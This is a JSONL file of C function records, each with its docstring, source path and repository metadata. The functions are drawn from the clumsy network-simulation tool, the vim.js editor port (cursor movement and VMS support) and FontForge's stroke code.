{"docstring": "// find the next packet fits the direction check or null\n", "func_signal": "static PacketNode* nextCorrectDirectionNode(PacketNode *p)", "code": "{\n    if (p == NULL) {\n        return NULL;\n    }\n\n    do {\n        p = p->next;\n    } while (p->next != NULL && !checkDirection(p->addr.Outbound, oodInbound, oodOutbound));\n\n    return p->next == NULL ? NULL : p;\n}", "path": "clumsy/src/ood.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// put this here to give a more random results\n", "func_signal": "static void tamperStartup()", "code": "{\n    LOG(\"tamper enabled\");\n    patIx = 0;\n}", "path": "clumsy/src/tamper.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// shared callbacks\n", "func_signal": "int uiSyncChance(Ihandle *ih)", "code": "{\n    char valueBuf[8];\n    float value = IupGetFloat(ih, \"VALUE\"), newValue = value;\n    short *chancePtr = (short*)IupGetAttribute(ih, SYNCED_VALUE);\n    if (newValue > 100.0f) {\n       newValue = 100.0f;\n    } else if (newValue < 0) {\n       newValue = 0.0f;\n    }\n    if (newValue != value) { // equality compare is fine since newValue is a copy of value\n        sprintf(valueBuf, \"%.1f\", newValue);\n        IupStoreAttribute(ih, \"VALUE\", valueBuf);\n        // put caret at end to enable editing while normalizing\n        IupStoreAttribute(ih, \"CARET\", \"10\");\n    }\n    // and sync chance value\n    InterlockedExchange16(chancePtr, (short)(newValue * 100));\n    return IUP_DEFAULT;\n}", "path": "clumsy/src/utils.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// create new CRateStat\n//---------------------------------------------------------------------\n", "func_signal": "CRateStats* crate_stats_new(int window_size, float scale)", "code": "{\n\tCRateStats *rate = (CRateStats*)malloc(sizeof(CRateStats));\n\tassert(rate);\n\trate->array_sum = (uint32_t*)malloc(sizeof(uint32_t) * window_size);\n\tassert(rate->array_sum);\n\trate->array_sample = (uint32_t*)malloc(sizeof(uint32_t) * window_size);\n\tassert(rate->array_sample);\n\trate->window_size = window_size;\n\trate->scale = scale;\n\tcrate_stats_reset(rate);\n\treturn rate;\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// pasta from:\n// http://stackoverflow.com/questions/8046097/how-to-check-if-a-process-has-the-admin-rights\n", "func_signal": "BOOL IsElevated( )", "code": "{\n    BOOL fRet = FALSE;\n    HANDLE hToken = NULL;\n    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {\n        TOKEN_ELEVATION Elevation;\n        DWORD cbSize = sizeof( TOKEN_ELEVATION );\n        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {\n            fRet = Elevation.TokenIsElevated;\n        }\n    }\n    if( hToken ) {\n        CloseHandle( hToken );\n    }\n    return fRet;\n}", "path": "clumsy/src/elevate.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "/*\n * Return TRUE when there are not 'scrolloff' lines above the cursor for the\n * current window.\n */\n", "func_signal": "static int\ncheck_top_offset()", "code": "{\n    lineoff_T\tloff;\n    int\t\tn;\n\n    if (curwin->w_cursor.lnum < curwin->w_topline + p_so\n#ifdef FEAT_FOLDING\n\t\t    || hasAnyFolding(curwin)\n#endif\n\t    )\n    {\n\tloff.lnum = curwin->w_cursor.lnum;\n#ifdef FEAT_DIFF\n\tloff.fill = 0;\n\tn = curwin->w_topfill;\t    /* always have this context */\n#else\n\tn = 0;\n#endif\n\t/* Count the visible screen lines above the cursor line. */\n\twhile (n < p_so)\n\t{\n\t    topline_back(&loff);\n\t    /* Stop when included a line above the window. */\n\t    if (loff.lnum < curwin->w_topline\n#ifdef FEAT_DIFF\n\t\t    || (loff.lnum == curwin->w_topline && loff.fill > 0)\n#endif\n\t\t    )\n\t\tbreak;\n\t    n += loff.height;\n\t}\n\tif (n < p_so)\n\t    return TRUE;\n    }\n    return FALSE;\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Make sure the value of curwin->w_botline is valid.\n */\n", "func_signal": "void\nvalidate_botline()", "code": "{\n    if (!(curwin->w_valid & VALID_BOTLINE))\n\tcomp_botline(curwin);\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n *\tmch_setenv\tVMS version of setenv()\n */\n", "func_signal": "int\nmch_setenv(char *var, char *value, int x)", "code": "{\n    int\t\tres, dum;\n    long\tattrib = 0L;\n    char\tacmode = PSL$C_SUPER;\t/* needs SYSNAM privilege */\n    DESC\ttabnam, lognam;\n    ITMLST1\titmlst;\n\n    vul_desc(&tabnam, \"LNM$JOB\");\n    vul_desc(&lognam, var);\n    vul_item(&itmlst.equ, value ? strlen(value) : 0, value ? LNM$_STRING : 0,\n\t    value, &dum);\n    itmlst.nul\t= 0;\n    res = sys$crelnm(&attrib, &tabnam, &lognam, &acmode, &itmlst);\n    return((res == 1) ? 0 : -1);\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Return the scrolljump value to use for the current window.\n * When 'scrolljump' is positive use it as-is.\n * When 'scrolljump' is negative use it as a percentage of the window height.\n */\n", "func_signal": "static int\nscrolljump_value()", "code": "{\n    if (p_sj >= 0)\n\treturn (int)p_sj;\n    return (curwin->w_height * -p_sj) / 100;\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Update curwin->w_topline and redraw if necessary.\n * Used to update the screen before printing a message.\n */\n", "func_signal": "void\nupdate_topline_redraw()", "code": "{\n    update_topline();\n    if (must_redraw)\n\tupdate_screen(0);\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Correct the cursor position so that it is in a part of the screen at least\n * 'so' lines from the top and bottom, if possible.\n * If not possible, put it at the same position as scroll_cursor_halfway().\n * When called topline must be valid!\n */\n", "func_signal": "void\ncursor_correct()", "code": "{\n    int\t\tabove = 0;\t    /* screen lines above topline */\n    linenr_T\ttopline;\n    int\t\tbelow = 0;\t    /* screen lines below botline */\n    linenr_T\tbotline;\n    int\t\tabove_wanted, below_wanted;\n    linenr_T\tcln;\t\t    /* Cursor Line Number */\n    int\t\tmax_off;\n\n    /*\n     * How many lines we would like to have above/below the cursor depends on\n     * whether the first/last line of the file is on screen.\n     */\n    above_wanted = p_so;\n    below_wanted = p_so;\n#ifdef FEAT_MOUSE\n    if (mouse_dragging > 0)\n    {\n\tabove_wanted = mouse_dragging - 1;\n\tbelow_wanted = mouse_dragging - 1;\n    }\n#endif\n    if (curwin->w_topline == 1)\n    {\n\tabove_wanted = 0;\n\tmax_off = curwin->w_height / 2;\n\tif (below_wanted > max_off)\n\t    below_wanted = max_off;\n    }\n    validate_botline();\n    if (curwin->w_botline == curbuf->b_ml.ml_line_count + 1\n#ifdef FEAT_MOUSE\n\t    && mouse_dragging == 0\n#endif\n\t    )\n    {\n\tbelow_wanted = 0;\n\tmax_off = (curwin->w_height - 1) / 2;\n\tif (above_wanted > max_off)\n\t    above_wanted = max_off;\n    }\n\n    /*\n     * If there are sufficient file-lines above and below the cursor, we can\n     * return now.\n     */\n    cln = curwin->w_cursor.lnum;\n    if (cln >= curwin->w_topline + above_wanted\n\t    && cln < curwin->w_botline - below_wanted\n#ifdef FEAT_FOLDING\n\t    && !hasAnyFolding(curwin)\n#endif\n\t    )\n\treturn;\n\n    /*\n     * Narrow down the area where the cursor can be put by taking lines from\n     * the top and the bottom until:\n     * - the desired context lines are found\n     * - the lines from the top is past the lines from the bottom\n     */\n    topline = curwin->w_topline;\n    botline = curwin->w_botline - 1;\n#ifdef FEAT_DIFF\n    /* count filler lines as context */\n    above = curwin->w_topfill;\n    below = curwin->w_filler_rows;\n#endif\n    while ((above < above_wanted || below < below_wanted) && topline < botline)\n    {\n\tif (below < below_wanted && (below <= above || above >= above_wanted))\n\t{\n#ifdef FEAT_FOLDING\n\t    if (hasFolding(botline, &botline, NULL))\n\t\t++below;\n\t    else\n#endif\n\t\tbelow += plines(botline);\n\t    --botline;\n\t}\n\tif (above < above_wanted && (above < below || below >= below_wanted))\n\t{\n#ifdef FEAT_FOLDING\n\t    if (hasFolding(topline, NULL, &topline))\n\t\t++above;\n\t    else\n#endif\n#ifndef FEAT_DIFF\n\t\tabove += plines(topline);\n#else\n\t\tabove += plines_nofill(topline);\n\n\t    /* Count filler lines below this line as context. */\n\t    if (topline < botline)\n\t\tabove += diff_check_fill(curwin, topline + 1);\n#endif\n\t    ++topline;\n\t}\n    }\n    if (topline == botline || botline == 0)\n\tcurwin->w_cursor.lnum = topline;\n    else if (topline > botline)\n\tcurwin->w_cursor.lnum = botline;\n    else\n    {\n\tif (cln < topline && curwin->w_topline > 1)\n\t{\n\t    curwin->w_cursor.lnum = topline;\n\t    curwin->w_valid &=\n\t\t\t    ~(VALID_WROW|VALID_WCOL|VALID_CHEIGHT|VALID_CROW);\n\t}\n\tif (cln > botline && curwin->w_botline <= curbuf->b_ml.ml_line_count)\n\t{\n\t    curwin->w_cursor.lnum = botline;\n\t    curwin->w_valid &=\n\t\t\t    ~(VALID_WROW|VALID_WCOL|VALID_CHEIGHT|VALID_CROW);\n\t}\n    }\n    curwin->w_valid |= VALID_TOPLINE;\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Validate cursor position.  Makes sure w_wrow and w_wcol are valid.\n * w_topline must be valid, you may need to call update_topline() first!\n */\n", "func_signal": "void\nvalidate_cursor()", "code": "{\n    check_cursor_moved(curwin);\n    if ((curwin->w_valid & (VALID_WCOL|VALID_WROW)) != (VALID_WCOL|VALID_WROW))\n\tcurs_columns(TRUE);\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n *\tvul_desc\tvult een descriptor met een string en de lengte\n *\t\t\thier van.\n */\n", "func_signal": "static void\nvul_desc(DESC *des, char *str)", "code": "{\n    des->dsc$b_dtype = DSC$K_DTYPE_T;\n    des->dsc$b_class = DSC$K_CLASS_S;\n    des->dsc$a_pointer = str;\n    des->dsc$w_length = str ? strlen(str) : 0;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * change unix and mixed filenames to VMS\n */\n", "func_signal": "void *\nvms_fixfilename(void *instring)", "code": "{\n    static char\t\t*buf = NULL;\n    static size_t\tbuflen = 0;\n    size_t\t\tlen;\n\n    /* get a big-enough buffer */\n    len = strlen(instring) + 1;\n    if (len > buflen)\n    {\n\tbuflen = len + 128;\n\tif (buf)\n\t    buf = (char *)vim_realloc(buf, buflen);\n\telse\n\t    buf = (char *)alloc(buflen * sizeof(char));\n    }\n\n#ifdef DEBUG\n     char\t\t *tmpbuf = NULL;\n     tmpbuf = (char *)alloc(buflen * sizeof(char));\n     strcpy(tmpbuf, instring);\n#endif\n\n    Fspec_Rms = buf;\t\t\t\t/* for decc$to_vms */\n\n    if (strchr(instring,'/') == NULL)\n\t/* It is already a VMS file spec */\n\tstrcpy(buf, instring);\n    else if (strchr(instring,'\"') == NULL)\t/* password in the path? */\n    {\n\t/* Seems it is a regular file, let guess that it is pure Unix fspec */\n\tif (decc$to_vms(instring, vms_fspec_proc, 0, 0) <= 0)\n\t    /* No... it must be mixed */\n\t    vms_unix_mixed_filespec(instring, buf);\n    }\n    else\n\t/* we have a password in the path   */\n\t/* decc$ functions can not handle   */\n\t/* this is our only hope to resolv  */\n\tvms_unix_mixed_filespec(instring, buf);\n\n    return buf;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * attempt to translate a mixed unix-vms file specification to pure vms\n */\n", "func_signal": "static void\nvms_unix_mixed_filespec(char *in, char *out)", "code": "{\n    char *lastcolon;\n    char *end_of_dir;\n    char ch;\n    int len;\n\n    /* copy vms filename portion up to last colon\n     * (node and/or disk)\n     */\n    lastcolon = strrchr(in, ':');   /* find last colon */\n    if (lastcolon != NULL) {\n\tlen = lastcolon - in + 1;\n\tstrncpy(out, in, len);\n\tout += len;\n\tin += len;\n    }\n\n    end_of_dir = NULL;\t/* default: no directory */\n\n    /* start of directory portion */\n    ch = *in;\n    if ((ch == '[') || (ch == '/') || (ch == '<')) {\t/* start of directory(s) ? */\n\tch = '[';\n\tSKIP_FOLLOWING_SLASHES(in);\n    } else if (EQN(in, \"../\", 3)) { /* Unix parent directory? */\n\t*out++ = '[';\n\t*out++ = '-';\n\tend_of_dir = out;\n\tch = '.';\n\tin += 2;\n\tSKIP_FOLLOWING_SLASHES(in);\n    } else {\t\t    /* not a special character */\n\twhile (EQN(in, \"./\", 2)) {\t/* Ignore Unix \"current dir\" */\n\t    in += 2;\n\t    SKIP_FOLLOWING_SLASHES(in);\n    }\n    if (strchr(in, '/') == NULL) {  /* any more Unix directories ? */\n\tstrcpy(out, in);\t/* No - get rest of the spec */\n\treturn;\n    } else {\n\t*out++ = '[';\t    /* Yes, denote a Vms subdirectory */\n\tch = '.';\n\t--in;\n\t}\n    }\n\n    /* if we get here, there is a directory part of the filename */\n\n    /* initialize output file spec */\n    *out++ = ch;\n    ++in;\n\n    while (*in != '\\0') {\n\tch = *in;\n\tif ((ch == ']') || (ch == '/') || (ch == '>') ) {\t/* end of (sub)directory ? */\n\t    end_of_dir = out;\n\t    ch = '.';\n\t    SKIP_FOLLOWING_SLASHES(in);\n\t    }\n\telse if (EQN(in, \"../\", 3)) {\t/* Unix parent directory? */\n\t    *out++ = '-';\n\t    end_of_dir = out;\n\t    ch = '.';\n\t    in += 2;\n\t    SKIP_FOLLOWING_SLASHES(in);\n\t    }\n\telse {\n\t    while (EQN(in, \"./\", 2)) {  /* Ignore Unix \"current dir\" */\n\t    end_of_dir = out;\n\t    in += 2;\n\t    SKIP_FOLLOWING_SLASHES(in);\n\t    ch = *in;\n\t    }\n\t}\n\n    /* Place next character into output file spec */\n\t*out++ = ch;\n\t++in;\n    }\n\n    *out = '\\0';    /* Terminate output file spec */\n\n    if (end_of_dir != NULL) /* Terminate directory portion */\n\t*end_of_dir = ']';\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Scroll the screen one line down, but don't do it if it would move the\n * cursor off the screen.\n */\n", "func_signal": "void\nscrolldown_clamp()", "code": "{\n    int\t\tend_row;\n#ifdef FEAT_DIFF\n    int\t\tcan_fill = (curwin->w_topfill\n\t\t\t\t< diff_check_fill(curwin, curwin->w_topline));\n#endif\n\n    if (curwin->w_topline <= 1\n#ifdef FEAT_DIFF\n\t    && !can_fill\n#endif\n\t    )\n\treturn;\n\n    validate_cursor();\t    /* w_wrow needs to be valid */\n\n    /*\n     * Compute the row number of the last row of the cursor line\n     * and make sure it doesn't go off the screen. Make sure the cursor\n     * doesn't go past 'scrolloff' lines from the screen end.\n     */\n    end_row = curwin->w_wrow;\n#ifdef FEAT_DIFF\n    if (can_fill)\n\t++end_row;\n    else\n\tend_row += plines_nofill(curwin->w_topline - 1);\n#else\n    end_row += plines(curwin->w_topline - 1);\n#endif\n    if (curwin->w_p_wrap\n#ifdef FEAT_VERTSPLIT\n\t\t&& curwin->w_width != 0\n#endif\n\t    )\n    {\n\tvalidate_cheight();\n\tvalidate_virtcol();\n\tend_row += curwin->w_cline_height - 1 -\n\t    curwin->w_virtcol / W_WIDTH(curwin);\n    }\n    if (end_row < curwin->w_height - p_so)\n    {\n#ifdef FEAT_DIFF\n\tif (can_fill)\n\t{\n\t    ++curwin->w_topfill;\n\t    check_topfill(curwin, TRUE);\n\t}\n\telse\n\t{\n\t    --curwin->w_topline;\n\t    curwin->w_topfill = 0;\n\t}\n#else\n\t--curwin->w_topline;\n#endif\n#ifdef FEAT_FOLDING\n\thasFolding(curwin->w_topline, &curwin->w_topline, NULL);\n#endif\n\t--curwin->w_botline;\t    /* approximate w_botline */\n\tcurwin->w_valid &= ~(VALID_WROW|VALID_CROW|VALID_BOTLINE);\n    }\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Convert VMS system() or lib$spawn() return code to Unix-like exit value.\n */\n", "func_signal": "int\nvms_sys_status(int status)", "code": "{\n    if (status != SS$_NORMAL && (status & STS$M_SUCCESS) == 0)\n\treturn status;\t\t/* Command failed. */\n    return 0;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n *\tmch_expand_wildcards\tthis code does wild-card pattern\n *\t\t\t\tmatching NOT using the shell\n *\n *\treturn OK for success, FAIL for error (you may lose some\n *\tmemory) and put an error message in *file.\n *\n *\tnum_pat\t   number of input patterns\n *\tpat\t   array of pointers to input patterns\n *\tnum_file   pointer to number of matched file names\n *\tfile\t   pointer to array of pointers to matched file names\n *\n */\n", "func_signal": "int\nmch_expand_wildcards(int num_pat, char_u **pat, int *num_file, char_u ***file, int flags)", "code": "{\n    int\t\ti, cnt = 0;\n    char_u\tbuf[MAXPATHL];\n    int\t\tdir;\n    int files_alloced, files_free;\n\n    *num_file = 0;\t\t\t/* default: no files found\t*/\n    files_alloced = EXPL_ALLOC_INC;\n    files_free = EXPL_ALLOC_INC;\n    *file = (char_u **) alloc(sizeof(char_u **) * files_alloced);\n    if (*file == NULL)\n    {\n\t*num_file = 0;\n\treturn FAIL;\n    }\n    for (i = 0; i < num_pat; i++)\n    {\n\t/* expand environment var or home dir */\n\tif (vim_strchr(pat[i],'$') || vim_strchr(pat[i],'~'))\n\t    expand_env(pat[i],buf,MAXPATHL);\n\telse\n\t    STRCPY(buf,pat[i]);\n\n\tvms_match_num = 0; /* reset collection counter */\n\tcnt = decc$to_vms(decc$translate_vms(vms_fixfilename(buf)), vms_wproc, 1, 0);\n\t\t\t\t\t\t      /* allow wild, no dir */\n\tif (cnt > 0)\n\t    cnt = vms_match_num;\n\n\tif (cnt < 1)\n\t    continue;\n\n\tfor (i = 0; i < cnt; i++)\n\t{\n\t    /* files should exist if expanding interactively */\n\t    if (!(flags & EW_NOTFOUND) && mch_getperm(vms_fmatch[i]) < 0)\n\t\tcontinue;\n\n\t    /* do not include directories */\n\t    dir = (mch_isdir(vms_fmatch[i]));\n\t    if (( dir && !(flags & EW_DIR)) || (!dir && !(flags & EW_FILE)))\n\t\tcontinue;\n\n\t    /* Skip files that are not executable if we check for that. */\n\t    if (!dir && (flags & EW_EXEC) && !mch_can_exe(vms_fmatch[i]))\n\t\tcontinue;\n\n\t    /* allocate memory for pointers */\n\t    if (--files_free < 1)\n\t    {\n\t\tfiles_alloced += EXPL_ALLOC_INC;\n\t\t*file = (char_u **)vim_realloc(*file,\n\t\t    sizeof(char_u **) * files_alloced);\n\t\tif (*file == NULL)\n\t\t{\n\t\t    *file = (char_u **)\"\";\n\t\t    *num_file = 0;\n\t\t    return(FAIL);\n\t\t}\n\t\tfiles_free = EXPL_ALLOC_INC;\n\t    }\n\n\t    (*file)[*num_file++] = vms_fmatch[i];\n\t}\n    }\n    return OK;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Get the current window size in Rows and Columns.\n */\n", "func_signal": "int\nmch_get_shellsize(void)", "code": "{\n    TT_MODE\ttmode;\n\n    tmode = get_tty();\t\t\t/* get size from VMS\t*/\n    Columns = tmode.width;\n    Rows = tmode.x.y.length;\n    return OK;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Use as many filler lines as possible for w_topline.  Make sure w_topline\n * is still visible.\n */\n", "func_signal": "static void\nmax_topfill()", "code": "{\n    int\t\tn;\n\n    n = plines_nofill(curwin->w_topline);\n    if (n >= curwin->w_height)\n\tcurwin->w_topfill = 0;\n    else\n    {\n\tcurwin->w_topfill = diff_check_fill(curwin, curwin->w_topline);\n\tif (curwin->w_topfill + n > curwin->w_height)\n\t    curwin->w_topfill = curwin->w_height - n;\n    }\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Remove version number from file name\n * we need it in some special cases as:\n * creating swap file name and writing new file\n */\n", "func_signal": "void\nvms_remove_version(void * fname)", "code": "{\n    char_u\t*cp;\n    char_u\t*fp;\n\n    if ((cp = vim_strchr( fname, ';')) != NULL) /* remove version */\n\t*cp = '\\0';\n    else if ((cp = vim_strrchr( fname, '.')) != NULL )\n    {\n\tif      ((fp = vim_strrchr( fname, ']')) != NULL ) {;}\n\telse if ((fp = vim_strrchr( fname, '>')) != NULL ) {;}\n\telse fp = fname;\n\n\twhile ( *fp != '\\0' && fp < cp )\n\t    if ( *fp++ == '.' )\n\t\t*cp = '\\0';\n    }\n    return ;\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Return TRUE if curwin->w_wrow and curwin->w_wcol are valid.\n */\n", "func_signal": "int\ncursor_valid()", "code": "{\n    check_cursor_moved(curwin);\n    return ((curwin->w_valid & (VALID_WROW|VALID_WCOL)) ==\n\t\t\t\t\t\t      (VALID_WROW|VALID_WCOL));\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * for decc$to_vms in vms_fixfilename\n */\n", "func_signal": "static int\nvms_fspec_proc(char *fil, int val)", "code": "{\n    strcpy(Fspec_Rms,fil);\n    return(1);\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Validate curwin->w_cline_height only.\n */\n", "func_signal": "static void\nvalidate_cheight()", "code": "{\n    check_cursor_moved(curwin);\n    if (!(curwin->w_valid & VALID_CHEIGHT))\n    {\n#ifdef FEAT_DIFF\n\tif (curwin->w_cursor.lnum == curwin->w_topline)\n\t    curwin->w_cline_height = plines_nofill(curwin->w_cursor.lnum)\n\t\t\t\t\t\t\t  + curwin->w_topfill;\n\telse\n#endif\n\t    curwin->w_cline_height = plines(curwin->w_cursor.lnum);\n#ifdef FEAT_FOLDING\n\tcurwin->w_cline_folded = hasFolding(curwin->w_cursor.lnum, NULL, NULL);\n#endif\n\tcurwin->w_valid |= VALID_CHEIGHT;\n    }\n}", "path": "vim.js/src/move.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/*\n * Try to set the window size to Rows and new_Columns.\n */\n", "func_signal": "void\nmch_set_shellsize(void)", "code": "{\n    set_tty(Rows, Columns);\n    switch (Columns)\n    {\n\tcase 132:\tOUT_STR_NF((char_u *)\"\\033[?3h\\033>\");\tbreak;\n\tcase 80:\tOUT_STR_NF((char_u *)\"\\033[?3l\\033>\");\tbreak;\n\tdefault:\tbreak;\n    }\n    out_flush();\n    screen_start();\n}", "path": "vim.js/src/os_vms.c", "commit_date": "2013-11-27 00:00:00", "repo_name": "coolwanglu/vim.js", "stars": 4454, "license": "other", "language": "c", "size": 65956}
{"docstring": "/******************************************************************************/\n/* ****************************** Configuration ***************************** */\n/******************************************************************************/\n", "func_signal": "StrokeInfo *InitializeStrokeInfo(StrokeInfo *sip)", "code": "{\n    if ( sip==NULL )\n\tsip = malloc(sizeof(StrokeInfo));\n\n    memset(sip, 0, sizeof(StrokeInfo));\n\n    sip->width = 50.0;\n    sip->join = lj_nib;\n    sip->cap = lc_nib;\n    sip->stroke_type = si_round;\n    sip->rmov = srmov_layer;\n    sip->simplify = true;\n    sip->extrema = true;\n    sip->jlrelative = true;\n    sip->ecrelative = true;\n    sip->leave_users_center = true;\n    sip->joinlimit = 10.0;\n    sip->accuracy_target = 0.25;\n\n    return sip;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* The offset from the stroked curve associated with unit tangent ut\n * (or it's reverse).\n */\n", "func_signal": "static NibOffset *_CalcNibOffset(NibCorner *nc, int n, BasePoint ut,\n                                 int reverse, NibOffset *no, int nci_hint)", "code": "{\n    int nci, ncni, ncpi;\n    Spline *ns;\n\n    if ( no==NULL )\n\tno = malloc(sizeof(NibOffset));\n\n    memset(no,0,sizeof(NibOffset));\n    no->utanvec = ut; // Store the unreversed value for reference\n\n    if ( reverse ) {\n\tut = BPRev(ut);\n\tno->reversed = 1;\n    }\n\n    nci = no->nci[0] = no->nci[1] = _IndexForUTanVec(nc, n, ut, nci_hint);\n    ncpi = N_PREVI(n, nci);\n    ncni = N_NEXTI(n, nci);\n\n    // The two cases where one of two points might draw the same angle\n    // and therefore the only cases where the array values differ\n    if (   nc[nci].linear\n\t// \"Capsule\" case\n        && BPNear(ut, nc[ncni].utv[NC_IN_IDX])\n        && BPNear(ut, nc[nci].utv[NC_IN_IDX]) ) {\n\tno->nt = 0.0;\n\tno->off[NIBOFF_CCW_IDX] = nc[nci].on_nib->me;\n\tno->off[NIBOFF_CW_IDX] = nc[ncni].on_nib->me;\n\tno->nci[NIBOFF_CW_IDX] = ncni;\n\tno->at_line = true;\n\tno->curve = false;\n    } else if ( nc[ncpi].linear && BPNear(ut, nc[ncpi].utv[NC_OUT_IDX]) ) {\n\t// Other lines\n\tno->nt = 0.0;\n\tno->off[NIBOFF_CCW_IDX] = nc[ncpi].on_nib->me;\n\tno->nci[NIBOFF_CCW_IDX] = ncpi;\n\tno->off[NIBOFF_CW_IDX] = nc[nci].on_nib->me;\n\tno->at_line = true;\n\tno->curve = false;\n    // When ut is (effectively) between IN and OUT the point\n    // draws the offset curve\n    } else if (   UTanVecsSequent(nc[nci].utv[NC_IN_IDX], ut,\n                                  nc[nci].utv[NC_OUT_IDX], false)\n               || BPNear(ut, nc[nci].utv[NC_OUT_IDX] ) ) {\n\tno->nt = 0.0;\n\tno->off[0] = no->off[1] = nc[nci].on_nib->me;\n\tno->curve = false;\n    // Otherwise ut is on a spline curve clockwise from point nci\n    } else {\n\tassert( UTanVecsSequent(nc[nci].utv[NC_OUT_IDX], ut,\n\t                        nc[ncni].utv[NC_IN_IDX], false) );\n\t// Nib splines are locally convex and therefore have t value per slope\n\tns = nc[nci].on_nib->next;\n\tno->nt = SplineSolveForUTanVec(ns, ut, 0.0, false);\n\tif ( no->nt<0 ) {\n\t    // At more extreme nib control point angles the solver may fail.\n\t    // In such cases the tangent angle should be near one of the \n\t    // endpoints, so pick the closer one\n\t    if (   BPLenSq(BPSub(nc[nci].utv[NC_OUT_IDX], ut))\n\t         < BPLenSq(BPSub(nc[ncni].utv[NC_IN_IDX], ut)) )\n\t\tno->nt = 0;\n\t    else\n\t\tno->nt = 1;\n\t}\n\tno->off[0] = no->off[1] = SPLINEPVAL(ns, no->nt);\n\tno->curve = true;\n    }\n    return no;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
